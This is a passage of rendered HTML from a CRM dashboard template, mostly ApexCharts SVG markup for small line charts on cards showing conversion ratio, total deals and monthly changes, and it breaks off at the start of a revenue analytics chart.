                                              id="SvgjsLine3357"
                                              x1="0"
                                              y1="40"
                                              x2="100"
                                              y2="40"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                          </g>
                                          <g
                                            id="SvgjsG3345"
                                            class="apexcharts-gridlines-vertical"
                                            style="display: none"
                                          ></g>
                                          <line
                                            id="SvgjsLine3359"
                                            x1="0"
                                            y1="40"
                                            x2="100"
                                            y2="40"
                                            stroke="transparent"
                                            stroke-dasharray="0"
                                            stroke-linecap="butt"
                                          ></line>
                                          <line
                                            id="SvgjsLine3358"
                                            x1="0"
                                            y1="1"
                                            x2="0"
                                            y2="40"
                                            stroke="transparent"
                                            stroke-dasharray="0"
                                            stroke-linecap="butt"
                                          ></line>
                                        </g>
                                        <g
                                          id="SvgjsG3346"
                                          class="apexcharts-grid-borders"
                                          style="display: none"
                                        ></g>
                                        <g
                                          id="SvgjsG3334"
                                          class="apexcharts-line-series apexcharts-plot-series"
                                        >
                                          <g
                                            id="SvgjsG3335"
                                            class="apexcharts-series"
                                            seriesName="Value"
                                            data:longestSeries="true"
                                            rel="1"
                                            data:realIndex="0"
                                          >
                                            <path
                                              id="SvgjsPath3342"
                                              d="M 0 8C 4.375 8 8.125 17.6 12.5 17.6C 16.875 17.6 20.625 8 25 8C 29.375 8 33.125 4.799999999999997 37.5 4.799999999999997C 41.875 4.799999999999997 45.625 25.6 50 25.6C 54.375 25.6 58.125 20.8 62.5 20.8C 66.875 20.8 70.625 9.600000000000001 75 9.600000000000001C 79.375 9.600000000000001 83.125 24 87.5 24C 91.875 24 95.625 0 100 0"
                                              fill="none"
                                              fill-opacity="1"
                                              stroke="url(#SvgjsLinearGradient3338)"
                                              stroke-opacity="1"
                                              stroke-linecap="butt"
                                              stroke-width="1.5"
                                              stroke-dasharray="0"
                                              class="apexcharts-line"
                                              index="0"
                                              clip-path="url(#gridRectMask4dqzvhcv)"
                                              pathTo="M 0 8C 4.375 8 8.125 17.6 12.5 17.6C 16.875 17.6 20.625 8 25 8C 29.375 8 33.125 4.799999999999997 37.5 4.799999999999997C 41.875 4.799999999999997 45.625 25.6 50 25.6C 54.375 25.6 58.125 20.8 62.5 20.8C 66.875 20.8 70.625 9.600000000000001 75 9.600000000000001C 79.375 9.600000000000001 83.125 24 87.5 24C 91.875 24 95.625 0 100 0"
                                              pathFrom="M -1 40 L -1 40 L 12.5 40 L 25 40 L 37.5 40 L 50 40 L 62.5 40 L 75 40 L 87.5 40 L 100 40"
                                              fill-rule="evenodd"
                                            ></path>
                                            <g
                                              id="SvgjsG3336"
                                              class="apexcharts-series-markers-wrap apexcharts-hidden-element-shown"
                                              data:realIndex="0"
                                            ></g>
                                          </g>
                                          <g
                                            id="SvgjsG3337"
                                            class="apexcharts-datalabels"
                                            data:realIndex="0"
                                          ></g>
                                        </g>
                                        <line
                                          id="SvgjsLine3360"
                                          x1="0"
                                          y1="0"
                                          x2="100"
                                          y2="0"
                                          stroke="#b6b6b6"
                                          stroke-dasharray="0"
                                          stroke-width="1"
                                          stroke-linecap="butt"
                                          class="apexcharts-ycrosshairs"
                                        ></line>
                                        <line
                                          id="SvgjsLine3361"
                                          x1="0"
                                          y1="0"
                                          x2="100"
                                          y2="0"
                                          stroke-dasharray="0"
                                          stroke-width="0"
                                          stroke-linecap="butt"
                                          class="apexcharts-ycrosshairs-hidden"
                                        ></line>
                                        <g
                                          id="SvgjsG3362"
                                          class="apexcharts-xaxis"
                                          transform="translate(0, 0)"
                                        >
                                          <g
                                            id="SvgjsG3363"
                                            class="apexcharts-xaxis-texts-g"
                                            transform="translate(0, -4)"
                                          ></g>
                                        </g>
                                        <g
                                          id="SvgjsG3374"
                                          class="apexcharts-yaxis-annotations"
                                        ></g>
                                        <g
                                          id="SvgjsG3375"
                                          class="apexcharts-xaxis-annotations"
                                        ></g>
                                        <g
                                          id="SvgjsG3376"
                                          class="apexcharts-point-annotations"
                                        ></g>
                                      </g>
                                    </svg>
                                  </div>
                                </div>
                              </div>
                              <div
                                class="d-flex align-items-center justify-content-between mt-1"
                              >
                                <div>
                                  <a
                                    class="text-secondary"
                                    href="javascript:void(0);"
                                    >View All<i
                                      class="ti ti-arrow-narrow-right ms-2 fw-semibold d-inline-block"
                                    ></i
                                  ></a>
                                </div>
                                <div class="text-end">
                                  <p class="mb-0 text-success fw-semibold">
                                    +25%
                                  </p>
                                  <span class="text-muted op-7 fs-11"
                                    >this month</span
                                  >
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="col-xxl-6 col-lg-6 col-md-6">
                      <div class="card custom-card overflow-hidden">
                        <div class="card-body">
                          <div
                            class="d-flex align-items-top justify-content-between"
                          >
                            <div>
                              <span
                                class="avatar avatar-md avatar-rounded bg-success"
                              >
                                <i class="ti ti-wave-square fs-16"></i>
                              </span>
                            </div>
                            <div class="flex-fill ms-3">
                              <div
                                class="d-flex align-items-center justify-content-between flex-wrap"
                              >
                                <div>
                                  <p class="text-muted mb-0">
                                    Conversion Ratio
                                  </p>
                                  <h4 class="fw-semibold mt-1">12.08%</h4>
                                </div>
                                <div
                                  id="crm-conversion-ratio"
                                  style="min-height: 40px"
                                >
                                  <div
                                    id="apexcharts68p8lk1n"
                                    class="apexcharts-canvas apexcharts68p8lk1n apexcharts-theme-light"
                                    style="width: 100px; height: 40px"
                                  >
                                    <svg
                                      id="SvgjsSvg3377"
                                      width="100"
                                      height="40"
                                      xmlns="http://www.w3.org/2000/svg"
                                      version="1.1"
                                      xmlns:xlink="http://www.w3.org/1999/xlink"
                                      xmlns:svgjs="http://svgjs.dev"
                                      class="apexcharts-svg"
                                      xmlns:data="ApexChartsNS"
                                      transform="translate(0, 0)"
                                      style="background: transparent"
                                    >
                                      <foreignObject
                                        x="0"
                                        y="0"
                                        width="100"
                                        height="40"
                                        ><div
                                          class="apexcharts-legend"
                                          xmlns="http://www.w3.org/1999/xhtml"
                                          style="max-height: 20px"
                                        ></div
                                      ></foreignObject>
                                      <rect
                                        id="SvgjsRect3381"
                                        width="0"
                                        height="0"
                                        x="0"
                                        y="0"
                                        rx="0"
                                        ry="0"
                                        opacity="1"
                                        stroke-width="0"
                                        stroke="none"
                                        stroke-dasharray="0"
                                        fill="#fefefe"
                                      ></rect>
                                      <g
                                        id="SvgjsG3424"
                                        class="apexcharts-yaxis"
                                        rel="0"
                                        transform="translate(-18, 0)"
                                      ></g>
                                      <g
                                        id="SvgjsG3379"
                                        class="apexcharts-inner apexcharts-graphical"
                                        transform="translate(0, 0)"
                                      >
                                        <defs id="SvgjsDefs3378">
                                          <clipPath id="gridRectMask68p8lk1n">
                                            <rect
                                              id="SvgjsRect3383"
                                              width="105.5"
                                              height="41.5"
                                              x="-2.75"
                                              y="-0.75"
                                              rx="0"
                                              ry="0"
                                              opacity="1"
                                              stroke-width="0"
                                              stroke="none"
                                              stroke-dasharray="0"
                                              fill="#fff"
                                            ></rect>
                                          </clipPath>
                                          <clipPath
                                            id="forecastMask68p8lk1n"
                                          ></clipPath>
                                          <clipPath
                                            id="nonForecastMask68p8lk1n"
                                          ></clipPath>
                                          <clipPath
                                            id="gridRectMarkerMask68p8lk1n"
                                          >
                                            <rect
                                              id="SvgjsRect3384"
                                              width="104"
                                              height="44"
                                              x="-2"
                                              y="-2"
                                              rx="0"
                                              ry="0"
                                              opacity="1"
                                              stroke-width="0"
                                              stroke="none"
                                              stroke-dasharray="0"
                                              fill="#fff"
                                            ></rect>
                                          </clipPath>
                                          <linearGradient
                                            id="SvgjsLinearGradient3389"
                                            x1="0"
                                            y1="1"
                                            x2="1"
                                            y2="1"
                                          >
                                            <stop
                                              id="SvgjsStop3390"
                                              stop-opacity="0.9"
                                              stop-color="rgba(19,96,74,0.9)"
                                              offset="0"
                                            ></stop>
                                            <stop
                                              id="SvgjsStop3391"
                                              stop-opacity="0.9"
                                              stop-color="rgba(38,191,148,0.9)"
                                              offset="0.98"
                                            ></stop>
                                            <stop
                                              id="SvgjsStop3392"
                                              stop-opacity="0.9"
                                              stop-color="rgba(38,191,148,0.9)"
                                              offset="1"
                                            ></stop>
                                          </linearGradient>
                                        </defs>
                                        <line
                                          id="SvgjsLine3382"
                                          x1="0"
                                          y1="0"
                                          x2="0"
                                          y2="40"
                                          stroke="#b6b6b6"
                                          stroke-dasharray="3"
                                          stroke-linecap="butt"
                                          class="apexcharts-xcrosshairs"
                                          x="0"
                                          y="0"
                                          width="1"
                                          height="40"
                                          fill="#b1b9c4"
                                          filter="none"
                                          fill-opacity="0.9"
                                          stroke-width="1"
                                        ></line>
                                        <g
                                          id="SvgjsG3394"
                                          class="apexcharts-grid"
                                        >
                                          <g
                                            id="SvgjsG3395"
                                            class="apexcharts-gridlines-horizontal"
                                            style="display: none"
                                          >
                                            <line
                                              id="SvgjsLine3398"
                                              x1="0"
                                              y1="0"
                                              x2="100"
                                              y2="0"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3399"
                                              x1="0"
                                              y1="4"
                                              x2="100"
                                              y2="4"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3400"
                                              x1="0"
                                              y1="8"
                                              x2="100"
                                              y2="8"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3401"
                                              x1="0"
                                              y1="12"
                                              x2="100"
                                              y2="12"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3402"
                                              x1="0"
                                              y1="16"
                                              x2="100"
                                              y2="16"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3403"
                                              x1="0"
                                              y1="20"
                                              x2="100"
                                              y2="20"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3404"
                                              x1="0"
                                              y1="24"
                                              x2="100"
                                              y2="24"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3405"
                                              x1="0"
                                              y1="28"
                                              x2="100"
                                              y2="28"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3406"
                                              x1="0"
                                              y1="32"
                                              x2="100"
                                              y2="32"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3407"
                                              x1="0"
                                              y1="36"
                                              x2="100"
                                              y2="36"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3408"
                                              x1="0"
                                              y1="40"
                                              x2="100"
                                              y2="40"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                          </g>
                                          <g
                                            id="SvgjsG3396"
                                            class="apexcharts-gridlines-vertical"
                                            style="display: none"
                                          ></g>
                                          <line
                                            id="SvgjsLine3410"
                                            x1="0"
                                            y1="40"
                                            x2="100"
                                            y2="40"
                                            stroke="transparent"
                                            stroke-dasharray="0"
                                            stroke-linecap="butt"
                                          ></line>
                                          <line
                                            id="SvgjsLine3409"
                                            x1="0"
                                            y1="1"
                                            x2="0"
                                            y2="40"
                                            stroke="transparent"
                                            stroke-dasharray="0"
                                            stroke-linecap="butt"
                                          ></line>
                                        </g>
                                        <g
                                          id="SvgjsG3397"
                                          class="apexcharts-grid-borders"
                                          style="display: none"
                                        ></g>
                                        <g
                                          id="SvgjsG3385"
                                          class="apexcharts-line-series apexcharts-plot-series"
                                        >
                                          <g
                                            id="SvgjsG3386"
                                            class="apexcharts-series"
                                            seriesName="Value"
                                            data:longestSeries="true"
                                            rel="1"
                                            data:realIndex="0"
                                          >
                                            <path
                                              id="SvgjsPath3393"
                                              d="M 0 8C 4.375 8 8.125 8 12.5 8C 16.875 8 20.625 4.799999999999997 25 4.799999999999997C 29.375 4.799999999999997 33.125 25.6 37.5 25.6C 41.875 25.6 45.625 17.6 50 17.6C 54.375 17.6 58.125 9.600000000000001 62.5 9.600000000000001C 66.875 9.600000000000001 70.625 24 75 24C 79.375 24 83.125 0 87.5 0C 91.875 0 95.625 20.8 100 20.8"
                                              fill="none"
                                              fill-opacity="1"
                                              stroke="url(#SvgjsLinearGradient3389)"
                                              stroke-opacity="1"
                                              stroke-linecap="butt"
                                              stroke-width="1.5"
                                              stroke-dasharray="0"
                                              class="apexcharts-line"
                                              index="0"
                                              clip-path="url(#gridRectMask68p8lk1n)"
                                              pathTo="M 0 8C 4.375 8 8.125 8 12.5 8C 16.875 8 20.625 4.799999999999997 25 4.799999999999997C 29.375 4.799999999999997 33.125 25.6 37.5 25.6C 41.875 25.6 45.625 17.6 50 17.6C 54.375 17.6 58.125 9.600000000000001 62.5 9.600000000000001C 66.875 9.600000000000001 70.625 24 75 24C 79.375 24 83.125 0 87.5 0C 91.875 0 95.625 20.8 100 20.8"
                                              pathFrom="M -1 40 L -1 40 L 12.5 40 L 25 40 L 37.5 40 L 50 40 L 62.5 40 L 75 40 L 87.5 40 L 100 40"
                                              fill-rule="evenodd"
                                            ></path>
                                            <g
                                              id="SvgjsG3387"
                                              class="apexcharts-series-markers-wrap apexcharts-hidden-element-shown"
                                              data:realIndex="0"
                                            ></g>
                                          </g>
                                          <g
                                            id="SvgjsG3388"
                                            class="apexcharts-datalabels"
                                            data:realIndex="0"
                                          ></g>
                                        </g>
                                        <line
                                          id="SvgjsLine3411"
                                          x1="0"
                                          y1="0"
                                          x2="100"
                                          y2="0"
                                          stroke="#b6b6b6"
                                          stroke-dasharray="0"
                                          stroke-width="1"
                                          stroke-linecap="butt"
                                          class="apexcharts-ycrosshairs"
                                        ></line>
                                        <line
                                          id="SvgjsLine3412"
                                          x1="0"
                                          y1="0"
                                          x2="100"
                                          y2="0"
                                          stroke-dasharray="0"
                                          stroke-width="0"
                                          stroke-linecap="butt"
                                          class="apexcharts-ycrosshairs-hidden"
                                        ></line>
                                        <g
                                          id="SvgjsG3413"
                                          class="apexcharts-xaxis"
                                          transform="translate(0, 0)"
                                        >
                                          <g
                                            id="SvgjsG3414"
                                            class="apexcharts-xaxis-texts-g"
                                            transform="translate(0, -4)"
                                          ></g>
                                        </g>
                                        <g
                                          id="SvgjsG3425"
                                          class="apexcharts-yaxis-annotations"
                                        ></g>
                                        <g
                                          id="SvgjsG3426"
                                          class="apexcharts-xaxis-annotations"
                                        ></g>
                                        <g
                                          id="SvgjsG3427"
                                          class="apexcharts-point-annotations"
                                        ></g>
                                      </g>
                                    </svg>
                                  </div>
                                </div>
                              </div>
                              <div
                                class="d-flex align-items-center justify-content-between mt-1"
                              >
                                <div>
                                  <a
                                    class="text-success"
                                    href="javascript:void(0);"
                                    >View All<i
                                      class="ti ti-arrow-narrow-right ms-2 fw-semibold d-inline-block"
                                    ></i
                                  ></a>
                                </div>
                                <div class="text-end">
                                  <p class="mb-0 text-danger fw-semibold">
                                    -12%
                                  </p>
                                  <span class="text-muted op-7 fs-11"
                                    >this month</span
                                  >
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="col-xxl-6 col-lg-6 col-md-6">
                      <div class="card custom-card overflow-hidden">
                        <div class="card-body">
                          <div
                            class="d-flex align-items-top justify-content-between"
                          >
                            <div>
                              <span
                                class="avatar avatar-md avatar-rounded bg-warning"
                              >
                                <i class="ti ti-briefcase fs-16"></i>
                              </span>
                            </div>
                            <div class="flex-fill ms-3">
                              <div
                                class="d-flex align-items-center justify-content-between flex-wrap"
                              >
                                <div>
                                  <p class="text-muted mb-0">Total Deals</p>
                                  <h4 class="fw-semibold mt-1">2,543</h4>
                                </div>
                                <div
                                  id="crm-total-deals"
                                  style="min-height: 40px"
                                >
                                  <div
                                    id="apexchartspc8mpo1vl"
                                    class="apexcharts-canvas apexchartspc8mpo1vl apexcharts-theme-light"
                                    style="width: 100px; height: 40px"
                                  >
                                    <svg
                                      id="SvgjsSvg3428"
                                      width="100"
                                      height="40"
                                      xmlns="http://www.w3.org/2000/svg"
                                      version="1.1"
                                      xmlns:xlink="http://www.w3.org/1999/xlink"
                                      xmlns:svgjs="http://svgjs.dev"
                                      class="apexcharts-svg"
                                      xmlns:data="ApexChartsNS"
                                      transform="translate(0, 0)"
                                      style="background: transparent"
                                    >
                                      <foreignObject
                                        x="0"
                                        y="0"
                                        width="100"
                                        height="40"
                                        ><div
                                          class="apexcharts-legend"
                                          xmlns="http://www.w3.org/1999/xhtml"
                                          style="max-height: 20px"
                                        ></div
                                      ></foreignObject>
                                      <rect
                                        id="SvgjsRect3432"
                                        width="0"
                                        height="0"
                                        x="0"
                                        y="0"
                                        rx="0"
                                        ry="0"
                                        opacity="1"
                                        stroke-width="0"
                                        stroke="none"
                                        stroke-dasharray="0"
                                        fill="#fefefe"
                                      ></rect>
                                      <g
                                        id="SvgjsG3475"
                                        class="apexcharts-yaxis"
                                        rel="0"
                                        transform="translate(-18, 0)"
                                      ></g>
                                      <g
                                        id="SvgjsG3430"
                                        class="apexcharts-inner apexcharts-graphical"
                                        transform="translate(0, 0)"
                                      >
                                        <defs id="SvgjsDefs3429">
                                          <clipPath id="gridRectMaskpc8mpo1vl">
                                            <rect
                                              id="SvgjsRect3434"
                                              width="105.5"
                                              height="41.5"
                                              x="-2.75"
                                              y="-0.75"
                                              rx="0"
                                              ry="0"
                                              opacity="1"
                                              stroke-width="0"
                                              stroke="none"
                                              stroke-dasharray="0"
                                              fill="#fff"
                                            ></rect>
                                          </clipPath>
                                          <clipPath
                                            id="forecastMaskpc8mpo1vl"
                                          ></clipPath>
                                          <clipPath
                                            id="nonForecastMaskpc8mpo1vl"
                                          ></clipPath>
                                          <clipPath
                                            id="gridRectMarkerMaskpc8mpo1vl"
                                          >
                                            <rect
                                              id="SvgjsRect3435"
                                              width="104"
                                              height="44"
                                              x="-2"
                                              y="-2"
                                              rx="0"
                                              ry="0"
                                              opacity="1"
                                              stroke-width="0"
                                              stroke="none"
                                              stroke-dasharray="0"
                                              fill="#fff"
                                            ></rect>
                                          </clipPath>
                                          <linearGradient
                                            id="SvgjsLinearGradient3440"
                                            x1="0"
                                            y1="1"
                                            x2="1"
                                            y2="1"
                                          >
                                            <stop
                                              id="SvgjsStop3441"
                                              stop-opacity="0.9"
                                              stop-color="rgba(123,92,37,0.9)"
                                              offset="0"
                                            ></stop>
                                            <stop
                                              id="SvgjsStop3442"
                                              stop-opacity="0.9"
                                              stop-color="rgba(245,184,73,0.9)"
                                              offset="0.98"
                                            ></stop>
                                            <stop
                                              id="SvgjsStop3443"
                                              stop-opacity="0.9"
                                              stop-color="rgba(245,184,73,0.9)"
                                              offset="1"
                                            ></stop>
                                          </linearGradient>
                                        </defs>
                                        <line
                                          id="SvgjsLine3433"
                                          x1="0"
                                          y1="0"
                                          x2="0"
                                          y2="40"
                                          stroke="#b6b6b6"
                                          stroke-dasharray="3"
                                          stroke-linecap="butt"
                                          class="apexcharts-xcrosshairs"
                                          x="0"
                                          y="0"
                                          width="1"
                                          height="40"
                                          fill="#b1b9c4"
                                          filter="none"
                                          fill-opacity="0.9"
                                          stroke-width="1"
                                        ></line>
                                        <g
                                          id="SvgjsG3445"
                                          class="apexcharts-grid"
                                        >
                                          <g
                                            id="SvgjsG3446"
                                            class="apexcharts-gridlines-horizontal"
                                            style="display: none"
                                          >
                                            <line
                                              id="SvgjsLine3449"
                                              x1="0"
                                              y1="0"
                                              x2="100"
                                              y2="0"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3450"
                                              x1="0"
                                              y1="4"
                                              x2="100"
                                              y2="4"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3451"
                                              x1="0"
                                              y1="8"
                                              x2="100"
                                              y2="8"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3452"
                                              x1="0"
                                              y1="12"
                                              x2="100"
                                              y2="12"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3453"
                                              x1="0"
                                              y1="16"
                                              x2="100"
                                              y2="16"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3454"
                                              x1="0"
                                              y1="20"
                                              x2="100"
                                              y2="20"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3455"
                                              x1="0"
                                              y1="24"
                                              x2="100"
                                              y2="24"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3456"
                                              x1="0"
                                              y1="28"
                                              x2="100"
                                              y2="28"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3457"
                                              x1="0"
                                              y1="32"
                                              x2="100"
                                              y2="32"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3458"
                                              x1="0"
                                              y1="36"
                                              x2="100"
                                              y2="36"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                            <line
                                              id="SvgjsLine3459"
                                              x1="0"
                                              y1="40"
                                              x2="100"
                                              y2="40"
                                              stroke="#e0e0e0"
                                              stroke-dasharray="0"
                                              stroke-linecap="butt"
                                              class="apexcharts-gridline"
                                            ></line>
                                          </g>
                                          <g
                                            id="SvgjsG3447"
                                            class="apexcharts-gridlines-vertical"
                                            style="display: none"
                                          ></g>
                                          <line
                                            id="SvgjsLine3461"
                                            x1="0"
                                            y1="40"
                                            x2="100"
                                            y2="40"
                                            stroke="transparent"
                                            stroke-dasharray="0"
                                            stroke-linecap="butt"
                                          ></line>
                                          <line
                                            id="SvgjsLine3460"
                                            x1="0"
                                            y1="1"
                                            x2="0"
                                            y2="40"
                                            stroke="transparent"
                                            stroke-dasharray="0"
                                            stroke-linecap="butt"
                                          ></line>
                                        </g>
                                        <g
                                          id="SvgjsG3448"
                                          class="apexcharts-grid-borders"
                                          style="display: none"
                                        ></g>
                                        <g
                                          id="SvgjsG3436"
                                          class="apexcharts-line-series apexcharts-plot-series"
                                        >
                                          <g
                                            id="SvgjsG3437"
                                            class="apexcharts-series"
                                            seriesName="Value"
                                            data:longestSeries="true"
                                            rel="1"
                                            data:realIndex="0"
                                          >
                                            <path
                                              id="SvgjsPath3444"
                                              d="M 0 8C 4.375 8 8.125 8 12.5 8C 16.875 8 20.625 4.799999999999997 25 4.799999999999997C 29.375 4.799999999999997 33.125 25.6 37.5 25.6C 41.875 25.6 45.625 20.8 50 20.8C 54.375 20.8 58.125 17.6 62.5 17.6C 66.875 17.6 70.625 9.600000000000001 75 9.600000000000001C 79.375 9.600000000000001 83.125 24 87.5 24C 91.875 24 95.625 0 100 0"
                                              fill="none"
                                              fill-opacity="1"
                                              stroke="url(#SvgjsLinearGradient3440)"
                                              stroke-opacity="1"
                                              stroke-linecap="butt"
                                              stroke-width="1.5"
                                              stroke-dasharray="0"
                                              class="apexcharts-line"
                                              index="0"
                                              clip-path="url(#gridRectMaskpc8mpo1vl)"
                                              pathTo="M 0 8C 4.375 8 8.125 8 12.5 8C 16.875 8 20.625 4.799999999999997 25 4.799999999999997C 29.375 4.799999999999997 33.125 25.6 37.5 25.6C 41.875 25.6 45.625 20.8 50 20.8C 54.375 20.8 58.125 17.6 62.5 17.6C 66.875 17.6 70.625 9.600000000000001 75 9.600000000000001C 79.375 9.600000000000001 83.125 24 87.5 24C 91.875 24 95.625 0 100 0"
                                              pathFrom="M -1 40 L -1 40 L 12.5 40 L 25 40 L 37.5 40 L 50 40 L 62.5 40 L 75 40 L 87.5 40 L 100 40"
                                              fill-rule="evenodd"
                                            ></path>
                                            <g
                                              id="SvgjsG3438"
                                              class="apexcharts-series-markers-wrap apexcharts-hidden-element-shown"
                                              data:realIndex="0"
                                            ></g>
                                          </g>
                                          <g
                                            id="SvgjsG3439"
                                            class="apexcharts-datalabels"
                                            data:realIndex="0"
                                          ></g>
                                        </g>
                                        <line
                                          id="SvgjsLine3462"
                                          x1="0"
                                          y1="0"
                                          x2="100"
                                          y2="0"
                                          stroke="#b6b6b6"
                                          stroke-dasharray="0"
                                          stroke-width="1"
                                          stroke-linecap="butt"
                                          class="apexcharts-ycrosshairs"
                                        ></line>
                                        <line
                                          id="SvgjsLine3463"
                                          x1="0"
                                          y1="0"
                                          x2="100"
                                          y2="0"
                                          stroke-dasharray="0"
                                          stroke-width="0"
                                          stroke-linecap="butt"
                                          class="apexcharts-ycrosshairs-hidden"
                                        ></line>
                                        <g
                                          id="SvgjsG3464"
                                          class="apexcharts-xaxis"
                                          transform="translate(0, 0)"
                                        >
                                          <g
                                            id="SvgjsG3465"
                                            class="apexcharts-xaxis-texts-g"
                                            transform="translate(0, -4)"
                                          ></g>
                                        </g>
                                        <g
                                          id="SvgjsG3476"
                                          class="apexcharts-yaxis-annotations"
                                        ></g>
                                        <g
                                          id="SvgjsG3477"
                                          class="apexcharts-xaxis-annotations"
                                        ></g>
                                        <g
                                          id="SvgjsG3478"
                                          class="apexcharts-point-annotations"
                                        ></g>
                                      </g>
                                    </svg>
                                  </div>
                                </div>
                              </div>
                              <div
                                class="d-flex align-items-center justify-content-between mt-1"
                              >
                                <div>
                                  <a
                                    class="text-warning"
                                    href="javascript:void(0);"
                                    >View All<i
                                      class="ti ti-arrow-narrow-right ms-2 fw-semibold d-inline-block"
                                    ></i
                                  ></a>
                                </div>
                                <div class="text-end">
                                  <p class="mb-0 text-success fw-semibold">
                                    +19%
                                  </p>
                                  <span class="text-muted op-7 fs-11"
                                    >this month</span
                                  >
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="col-xl-12">
                      <div class="card custom-card">
                        <div class="card-header justify-content-between">
                          <div class="card-title">Revenue Analytics</div>
                          <div class="dropdown">
                            <a
                              href="javascript:void(0);"
                              class="p-2 fs-12 text-muted"
                              data-bs-toggle="dropdown"
                              aria-expanded="false"
                            >
                              View All<i
                                class="ri-arrow-down-s-line align-middle ms-1 d-inline-block"
                              ></i>
                            </a>
                            <ul class="dropdown-menu" role="menu">
                              <li>
                                <a
                                  class="dropdown-item"
                                  href="javascript:void(0);"
                                  >Today</a
                                >
                              </li>
                              <li>
                                <a
                                  class="dropdown-item"
                                  href="javascript:void(0);"
                                  >This Week</a
                                >
                              </li>
                              <li>
                                <a
                                  class="dropdown-item"
                                  href="javascript:void(0);"
                                  >Last Week</a
                                >
                              </li>
                            </ul>
                          </div>
                        </div>
                        <div class="card-body">
                          <div class="content-wrapper">
                            <div
                              id="crm-revenue-analytics"
                              style="min-height: 365px"
                            >
                              <div
                                id="apexchartswuayproi"
                                class="apexcharts-canvas apexchartswuayproi apexcharts-theme-light"
                                style="width: 675px; height: 350px"
                              >
                                <svg
                                  id="SvgjsSvg3482"
                                  width="675"
                                  height="350"
                                  xmlns="http://www.w3.org/2000/svg"
                                  version="1.1"
                                  xmlns:xlink="http://www.w3.org/1999/xlink"
                                  xmlns:svgjs="http://svgjs.dev"
                                  class="apexcharts-svg apexcharts-zoomable"
                                  xmlns:data="ApexChartsNS"
                                  transform="translate(0, 0)"
                                  style="background: transparent"
                                >
                                  <foreignObject
                                    x="0"
                                    y="0"
                                    width="675"
                                    height="350"
                                    ><div
                                      class="apexcharts-legend apexcharts-align-center apx-legend-position-bottom"
                                      xmlns="http://www.w3.org/1999/xhtml"
                                      style="
                                        inset: auto 0px 1px;
                                        position: absolute;
                                        max-height: 175px;
                                      "
                                    >
                                      <div
                                        class="apexcharts-legend-series"
                                        rel="3"
                                        seriesname="Sales"
                                        data:collapsed="false"
                                        style="margin: 2px 5px"
                                      >
                                        <span
                                          class="apexcharts-legend-marker"
                                          rel="3"
                                          data:collapsed="false"
                                          style="
                                            background: rgba(
                                              119,
                                              119,
                                              142,
                                              0.05
                                            ) !important;
                                            color: rgba(119, 119, 142, 0.05);
                                            height: 12px;
                                            width: 12px;
                                            left: 0px;
                                            top: 0px;
                                            border-width: 0px;
                                            border-color: rgb(255, 255, 255);
